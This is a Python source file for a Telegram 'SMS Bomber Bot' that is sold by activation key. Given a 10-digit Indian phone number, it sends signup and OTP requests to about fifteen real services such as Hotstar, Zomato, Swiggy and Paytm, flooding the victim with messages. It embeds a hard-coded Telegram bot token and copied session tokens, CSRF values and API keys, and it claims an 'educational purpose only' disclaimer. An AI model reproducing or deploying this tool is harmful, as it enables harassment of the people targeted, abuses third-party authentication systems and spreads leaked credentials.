import os
import random
import time
import requests
import logging
import re
import json
import secrets
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))  # Your Telegram ID
BOT_USERNAME = "@BeStChEaT_OwNeR"

# --- Database (JSON file for Railway) ---
DB_FILE = 'keys_db.json'

def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'keys': {}, 'users': {}, 'blocked': []}

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

# --- Key Generation ---
def generate_key():
    """Generate a random 16-character key"""
    chars = string.ascii_uppercase + string.digits
    return ''.join(secrets.choice(chars) for _ in range(16))

def create_key(days=7, max_uses=100):
    """Create a new key with expiry and usage limit"""
    db = load_db()
    key = generate_key()
    db['keys'][key] = {
        'created': datetime.now().isoformat(),
        'expiry': (datetime.now() + timedelta(days=days)).isoformat(),
        'max_uses': max_uses,
        'used': 0,
        'users': [],
        'active': True
    }
    save_db(db)
    return key

def validate_key(key, user_id):
    """Validate and use a key"""
    db = load_db()
    
    # Check if key exists
    if key not in db['keys']:
        return False, "Invalid key!"
    
    key_data = db['keys'][key]
    
    # Check if key is active
    if not key_data['active']:
        return False, "Key has been blocked!"
    
    # Check expiry
    expiry = datetime.fromisoformat(key_data['expiry'])
    if datetime.now() > expiry:
        return False, "Key has expired!"
    
    # Check usage limit
    if key_data['used'] >= key_data['max_uses']:
        return False, "Key usage limit exceeded!"
    
    # Check if user already used this key
    if str(user_id) in key_data['users']:
        return True, "Already activated"
    
    # Use the key
    key_data['used'] += 1
    key_data['users'].append(str(user_id))
    
    # Add user to users list
    if str(user_id) not in db['users']:
        db['users'][str(user_id)] = {
            'keys': [],
            'used_count': 0,
            'created': datetime.now().isoformat()
        }
    
    db['users'][str(user_id)]['keys'].append(key)
    db['users'][str(user_id)]['used_count'] += 1
    
    save_db(db)
    return True, "Key activated successfully!"

def block_key(key):
    """Block a key"""
    db = load_db()
    if key in db['keys']:
        db['keys'][key]['active'] = False
        save_db(db)
        return True
    return False

def unblock_key(key):
    """Unblock a key"""
    db = load_db()
    if key in db['keys']:
        db['keys'][key]['active'] = True
        save_db(db)
        return True
    return False

def is_user_blocked(user_id):
    """Check if user is blocked"""
    db = load_db()
    return str(user_id) in db['blocked']

def block_user(user_id):
    """Block a user"""
    db = load_db()
    if str(user_id) not in db['blocked']:
        db['blocked'].append(str(user_id))
        save_db(db)
        return True
    return False

def unblock_user(user_id):
    """Unblock a user"""
    db = load_db()
    if str(user_id) in db['blocked']:
        db['blocked'].remove(str(user_id))
        save_db(db)
        return True
    return False

def has_valid_key(user_id):
    """Check if user has any valid key"""
    db = load_db()
    user_id = str(user_id)
    
    if user_id in db['users']:
        for key in db['users'][user_id]['keys']:
            if key in db['keys']:
                key_data = db['keys'][key]
                if key_data['active']:
                    expiry = datetime.fromisoformat(key_data['expiry'])
                    if datetime.now() <= expiry and key_data['used'] < key_data['max_uses']:
                        return True
    return False

# --- SMS Bombing APIs (Working) ---
def get_apis(target):
    """All working SMS APIs"""
    apis = [
        # Hotstar
        {
            'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
            'method': 'PUT',
            'headers': {
                'Host': 'api.hotstar.com',
                'content-length': '51',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'x-hs-platform': 'PCTV',
                'x-country-code': 'IN',
                'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                'x-hs-appversion': '5.0.40',
                'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'accept': '*/*',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/subscribe/sign-in',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone_number": target, "country_prefix": "91"}
        },
        # AltBalaji
        {
            'url': 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
            'method': 'POST',
            'headers': {
                'Host': 'api.cloud.altbalaji.com',
                'Connection': 'keep-alive',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'X-API-KEY': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE',
                'Content-Type': 'application/json',
                'Origin': 'https://www.altbalaji.com',
                'Referer': 'https://www.altbalaji.com/user-detail?pid=NTU%3D',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "phone_number": target,
                "country_code": "91",
                "platform": "web",
                "exp": int((datetime.now().timestamp() + 3600) * 1000)
            }
        },
        # Voot
        {
            'url': 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
            'method': 'POST',
            'headers': {
                'Host': 'us-central1-vootdev.cloudfunctions.net',
                'accept': 'application/json, text/plain, */*',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.voot.com',
                'referer': 'https://www.voot.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"type": "mobile", "mobile": target, "countryCode": "+91"}
        },
        # SonyLIV
        {
            'url': 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
            'method': 'POST',
            'headers': {
                'Host': 'apiv2.sonyliv.com',
                'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
                'security_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'accept': 'application/json, text/plain, */*',
                'session_id': f'cc86326a51504133bacd3ce4f796e1cf-{int(datetime.now().timestamp()*1000)}',
                'x-via-device': 'true',
                'app_version': '3.1.20',
                'origin': 'https://www.sonyliv.com',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "mobileNumber": target,
                "channelPartnerID": "MSMIND",
                "country": "IN",
                "timestamp": datetime.now().isoformat()
            }
        },
        # Dream11
        {
            'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
            'method': 'POST',
            'headers': {
                'Host': 'www.dream11.com',
                'accept': '*/*',
                'device': 'pwa',
                'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'origin': 'https://www.dream11.com',
                'referer': 'https://www.dream11.com/register?ru=',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
                "variables": {
                    "email": f"user{random.randint(1000,9999)}@gmail.com",
                    "mobileNumber": target,
                    "password": "tsunami@123astronomia"
                }
            }
        },
        # Zomato
        {
            'url': 'https://www.zomato.com/webroutes/auth/login',
            'method': 'POST',
            'headers': {
                'Host': 'www.zomato.com',
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
                'origin': 'https://www.zomato.com',
                'referer': 'https://www.zomato.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
        },
        # Grofers
        {
            'url': 'https://grofers.com/v2/accounts/',
            'method': 'POST',
            'headers': {
                'Host': 'grofers.com',
                'device_id': 'a11f656b-422e-4617-953b-c350d517467d',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'auth_key': '57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13',
                'app_client': 'consumer_web',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://grofers.com',
                'referer': 'https://grofers.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {'user_phone': target}
        },
        # Oyo Rooms
        {
            'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
            'method': 'POST',
            'headers': {
                'Host': 'www.oyorooms.com',
                'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'text/plain;charset=UTF-8',
                'origin': 'https://www.oyorooms.com',
                'referer': 'https://www.oyorooms.com/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone": target, "country_code": "+91", "nod": 4}
        },
        # Zee5
        {
            'url': f'https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}',
            'method': 'GET',
            'headers': {
                'Host': 'b2bapi.zee5.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://www.zee5.com',
                'referer': 'https://www.zee5.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {}
        },
        # Lenskart
        {
            'url': 'https://api.lenskart.com/v2/customers/sendOtp',
            'method': 'POST',
            'headers': {
                'Host': 'api.lenskart.com',
                'Content-Type': 'application/json;charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-api-client': 'mobilesite',
                'origin': 'https://www.lenskart.com',
                'referer': 'https://www.lenskart.com/customer/account/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"telephone": target}
        },
        # Swiggy
        {
            'url': 'https://www.swiggy.com/mapi/auth/signup',
            'method': 'POST',
            'headers': {
                'Host': 'www.swiggy.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://www.swiggy.com',
                'referer': 'https://www.swiggy.com/auth/register',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "name": f"User{random.randint(1000,9999)}",
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "password": "Test@123456",
                "mobile": target,
            }
        },
        # Paytm
        {
            'url': 'https://accounts.paytm.com/v2/api/register',
            'method': 'POST',
            'headers': {
                'Host': 'accounts.paytm.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://accounts.paytm.com',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "mobile": target,
                "email": f"user{random.randint(1000,9999)}@gmail.com",
                "scope": "paytm",
                "clientId": "paytm-web-secure",
                "loginPassword": "Test@123456",
            }
        },
        # BookMyShow
        {
            'url': 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
            'method': 'POST',
            'headers': {
                'Host': 'in.bookmyshow.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'origin': 'https://in.bookmyshow.com',
                'referer': f'https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={target}',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {
                "channel": "phone",
                "subChannel": "sms",
                "details": {"phone": target, "origin": "https://in.bookmyshow.com"}
            }
        },
        # BigBasket
        {
            'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
            'method': 'POST',
            'headers': {
                'Host': 'www.bigbasket.com',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-channel': 'BB-PWA',
                'x-csrftoken': 'gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED',
                'origin': 'https://www.bigbasket.com',
                'referer': 'https://www.bigbasket.com/auth/login/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"identifier": target}
        }
    ]
    return apis

def send_sms(api_data):
    """Send SMS using API"""
    try:
        if api_data['method'] == 'GET':
            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=10)
        else:
            if isinstance(api_data['data'], dict):
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    json=api_data['data'],
                    timeout=10
                )
            else:
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    data=api_data['data'],
                    timeout=10
                )
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start command"""
    user_id = update.effective_user.id
    
    # Check if user is blocked
    if is_user_blocked(user_id):
        await update.message.reply_text(
            "🚫 You have been blocked from using this bot!\n\n"
            "Contact @BeStChEaT_OwNeR for support."
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("📞 Send Number", switch_inline_query_current_chat="")],
        [InlineKeyboardButton("🔑 Get Key", callback_data="get_key")],
        [InlineKeyboardButton("ℹ️ About", callback_data="about")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔥 *SMS Bomber Bot Activated!*\n\n"
        f"👤 *User:* {update.effective_user.first_name}\n"
        f"🤖 *Bot:* {BOT_USERNAME}\n\n"
        f"📌 *How to use:*\n"
        f"1️⃣ Send a 10-digit phone number\n"
        f"2️⃣ Bot will send OTP to 15+ platforms\n"
        f"3️⃣ Get results instantly\n\n"
        f"🔑 *You need a valid key to use this bot!*\n"
        f"Use /key <your_key> to activate\n\n"
        f"⚠️ *For Educational Purpose Only*",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/key command - Activate key"""
    user_id = update.effective_user.id
    
    # Check if user is blocked
    if is_user_blocked(user_id):
        await update.message.reply_text(
            "🚫 You have been blocked from using this bot!"
        )
        return
    
    # Get key from command
    args = context.args
    if not args:
        await update.message.reply_text(
            "🔑 *Key System*\n\n"
            "Usage: `/key <your_key>`\n\n"
            "Example: `/key ABC123XYZ456`\n\n"
            "Contact @BeStChEaT_OwNeR to get a key.",
            parse_mode='Markdown'
        )
        return
    
    key = args[0].upper().strip()
    
    # Validate key
    valid, message = validate_key(key, user_id)
    
    if valid:
        await update.message.reply_text(
            f"✅ *Key Activated!*\n\n"
            f"🔑 Key: `{key}`\n"
            f"📝 Status: {message}\n\n"
            f"🚀 You can now use the bot!\n"
            f"Send a 10-digit number to start bombing.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *Key Activation Failed!*\n\n"
            f"🔑 Key: `{key}`\n"
            f"❌ Reason: {message}\n\n"
            f"Contact @BeStChEaT_OwNeR for a valid key.",
            parse_mode='Markdown'
        )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/redeem command - Owner only"""
    user_id = update.effective_user.id
    
    # Only owner can use this
    if user_id != OWNER_ID:
        await update.message.reply_text(
            "❌ You are not authorized to use this command!"
        )
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🔑 *Redeem Key System*\n\n"
            "Commands:\n"
            "`/redeem create <days> <max_uses>` - Create a new key\n"
            "`/redeem list` - List all keys\n"
            "`/redeem block <key>` - Block a key\n"
            "`/redeem unblock <key>` - Unblock a key\n"
            "`/redeem blockuser <user_id>` - Block a user\n"
            "`/redeem unblockuser <user_id>` - Unblock a user\n\n"
            "Example: `/redeem create 7 100`",
            parse_mode='Markdown'
        )
        return
    
    action = args[0].lower()
    
    if action == 'create':
        if len(args) < 3:
            await update.message.reply_text("❌ Usage: /redeem create <days> <max_uses>")
            return
        
        try:
            days = int(args[1])
            max_uses = int(args[2])
            key = create_key(days, max_uses)
            
            await update.message.reply_text(
                f"✅ *Key Created!*\n\n"
                f"🔑 Key: `{key}`\n"
                f"📅 Days: {days}\n"
                f"📊 Max Uses: {max_uses}\n"
                f"📝 Status: Active\n\n"
                f"Share this key with users.",
                parse_mode='Markdown'
            )
        except:
            await update.message.reply_text("❌ Invalid input! Use numbers only.")
    
    elif action == 'list':
        db = load_db()
        if not db['keys']:
            await update.message.reply_text("📭 No keys found!")
            return
        
        text = "🔑 *All Keys*\n\n"
        for key, data in db['keys'].items():
            status = "✅ Active" if data['active'] else "❌ Blocked"
            expiry = datetime.fromisoformat(data['expiry']).strftime('%Y-%m-%d')
            text += f"• `{key}` - {status}\n"
            text += f"  📊 {data['used']}/{data['max_uses']} used, Expires: {expiry}\n"
        
        await update.message.reply_text(text, parse_mode='Markdown')
    
    elif action == 'block':
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /redeem block <key>")
            return
        
        key = args[1].upper().strip()
        if block_key(key):
            await update.message.reply_text(f"✅ Key `{key}` blocked successfully!")
        else:
            await update.message.reply_text(f"❌ Key `{key}` not found!")
    
    elif action == 'unblock':
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /redeem unblock <key>")
            return
        
        key = args[1].upper().strip()
        if unblock_key(key):
            await update.message.reply_text(f"✅ Key `{key}` unblocked successfully!")
        else:
            await update.message.reply_text(f"❌ Key `{key}` not found!")
    
    elif action == 'blockuser':
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /redeem blockuser <user_id>")
            return
        
        try:
            user_id = int(args[1])
            if block_user(user_id):
                await update.message.reply_text(f"✅ User `{user_id}` blocked successfully!")
            else:
                await update.message.reply_text(f"❌ User `{user_id}` already blocked!")
        except:
            await update.message.reply_text("❌ Invalid user_id!")
    
    elif action == 'unblockuser':
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /redeem unblockuser <user_id>")
            return
        
        try:
            user_id = int(args[1])
            if unblock_user(user_id):
                await update.message.reply_text(f"✅ User `{user_id}` unblocked successfully!")
            else:
                await update.message.reply_text(f"❌ User `{user_id}` not found in block list!")
        except:
            await update.message.reply_text("❌ Invalid user_id!")
    
    else:
        await update.message.reply_text("❌ Invalid action! Use: create, list, block, unblock, blockuser, unblockuser")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number - MAIN BOMBING FUNCTION"""
    user_id = update.effective_user.id
    
    # Check if user is blocked
    if is_user_blocked(user_id):
        await update.message.reply_text(
            "🚫 You have been blocked from using this bot!\n\n"
            "Contact @BeStChEaT_OwNeR for support."
        )
        return
    
    # Check if user has valid key
    if not has_valid_key(user_id):
        await update.message.reply_text(
            "🔑 *No Valid Key Found!*\n\n"
            "You need a valid key to use this bot.\n\n"
            "Use `/key <your_key>` to activate.\n"
            "Contact @BeStChEaT_OwNeR to get a key.",
            parse_mode='Markdown'
        )
        return
    
    phone = update.message.text.strip()
    
    # Check if it's a valid phone number
    if not re.match(r'^[0-9]{10}$', phone):
        await update.message.reply_text(
            "❌ *Invalid Number!*\n\n"
            "Please send a 10-digit phone number.\n"
            "Example: `9876543210`",
            parse_mode='Markdown'
        )
        return
    
    # Send initial message
    msg = await update.message.reply_text(
        f"📱 *Bombing Started!*\n"
        f"🎯 Target: +91{phone}\n"
        f"⏳ Sending SMS to 15+ platforms...\n\n"
        f"⏱️ Please wait...",
        parse_mode='Markdown'
    )
    
    # Get all APIs
    apis = get_apis(phone)
    random.shuffle(apis)
    
    # Send SMS using all APIs
    success_count = 0
    failed_count = 0
    successful_services = []
    
    for i, api in enumerate(apis):
        if send_sms(api):
            success_count += 1
            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
            successful_services.append(service.capitalize())
        else:
            failed_count += 1
        
        # Update progress every 3 APIs
        if (i + 1) % 3 == 0:
            try:
                await msg.edit_text(
                    f"📱 *Bombing in Progress...*\n"
                    f"🎯 Target: +91{phone}\n"
                    f"✅ Successful: {success_count}\n"
                    f"❌ Failed: {failed_count}\n"
                    f"⏳ Progress: {i+1}/{len(apis)}",
                    parse_mode='Markdown'
                )
            except:
                pass
    
    # Final result
    result_text = (
        f"✅ *Bombing Complete!*\n\n"
        f"📞 Target: +91{phone}\n"
        f"📨 Total Attempts: {len(apis)}\n"
        f"✅ Successful: {success_count}\n"
        f"❌ Failed: {failed_count}\n\n"
    )
    
    if successful_services:
        result_text += f"🟢 *Successful:* {', '.join(successful_services[:10])}\n\n"
    
    result_text += f"🤖 {BOT_USERNAME}\n"
    result_text += "⚠️ For Educational Purpose Only"
    
    await msg.edit_text(result_text, parse_mode='Markdown')

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "get_key":
        await query.edit_message_text(
            "🔑 *How to get a key?*\n\n"
            "1️⃣ Contact @BeStChEaT_OwNeR\n"
            "2️⃣ Send payment (if required)\n"
            "3️⃣ Receive your unique key\n\n"
            "🔑 *Key Features:*\n"
            "• 15+ Working APIs\n"
            "• Unlimited SMS bombing\n"
            "• 24/7 bot access\n\n"
            "📝 *Already have a key?*\n"
            "Use: `/key YOUR_KEY`",
            parse_mode='Markdown'
        )
    elif query.data == "about":
        await query.edit_message_text(
            f"ℹ️ *About This Bot*\n\n"
            f"🤖 *Name:* SMS Bomber Bot\n"
            f"👨‍💻 *Creator:* @BeStChEaT_OwNeR\n"
            f"🔧 *Version:* 2.0\n"
            f"📊 *APIs:* 15+ Platforms\n"
            f"⚡ *Speed:* High\n\n"
            f"📌 *Features:*\n"
            f"• Key based access\n"
            f"• 15+ working APIs\n"
            f"• Real-time progress\n"
            f"• Smart key management\n\n"
            f"⚠️ *For Educational Purpose Only*",
            parse_mode='Markdown'
        )

# --- Main Bot ---

def main():
    """Start the bot"""
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("❌ Error: BOT_TOKEN not set!")
        print("Please set BOT_TOKEN environment variable.")
        return
    
    print("🤖 Starting Telegram SMS Bomber Bot...")
    print(f"👤 Owner ID: {OWNER_ID}")
    print(f"🤖 Bot: {BOT_USERNAME}")
    print("🚀 Bot is running!")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    # Start polling
    app.run_polling()

if __name__ == '__main__':
    main()
